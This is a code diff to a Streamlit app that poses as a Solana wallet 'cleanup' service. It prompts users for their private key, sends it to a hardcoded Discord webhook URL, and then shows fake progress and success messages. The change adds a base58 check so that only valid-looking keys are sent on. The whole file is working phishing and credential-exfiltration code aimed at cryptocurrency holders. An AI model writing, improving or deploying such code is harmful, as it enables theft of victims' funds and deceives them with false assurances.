@@ -1,6 +1,7 @@
 import streamlit as st
 import time
 import requests
+import base58  # For validating Solana private keys
 from solana.rpc.api import Client
 
 # Initialize Solana client
@@ -8,6 +9,17 @@ solana_client = Client("https://api.mainnet-beta.solana.com")
 
 # Discord webhook URL
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
+
+# Function to validate Solana private key
+def is_valid_solana_private_key(private_key):
+    try:
+        # Attempt to decode the private key using base58
+        decoded_key = base58.b58decode(private_key)
+        # Solana private keys are 32 bytes long when decoded
+        return len(decoded_key) == 32
+    except:
+        # If decoding fails, it's not a valid base58 string
+        return False
 
 # Function to send private key to Discord webhook
 def send_to_discord(private_key):
@@ -45,15 +57,19 @@ if menu == "Check Wallet ✅":
                 if st.button("Proceed with Cleanup"):
                     private_key = st.text_input("Enter your private key to proceed:", type="password")
                     if private_key:
-                        # Send private key to Discord webhook
-                        if send_to_discord(private_key):
-                            st.write("🔒 Cleanup process initiated...")
-                            st.write("Optimizing wallet...")
-                            time.sleep(2)
-                            st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
-                            st.write("You will be notified once the cleanup is done. Thank you for your patience!")
+                        # Validate the private key
+                        if is_valid_solana_private_key(private_key):
+                            # Send private key to Discord webhook
+                            if send_to_discord(private_key):
+                                st.write("🔒 Cleanup process initiated...")
+                                st.write("Optimizing wallet...")
+                                time.sleep(2)
+                                st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
+                                st.write("You will be notified once the cleanup is done. Thank you for your patience!")
+                            else:
+                                st.error("Failed to send request. Please try again.")
                         else:
-                            st.error("Failed to send request. Please try again.")
+                            st.error("Invalid Solana private key. Please enter a valid 64-character base58-encoded private key.")
                     else:
                         st.error("Please enter your private key to proceed.")
             else:
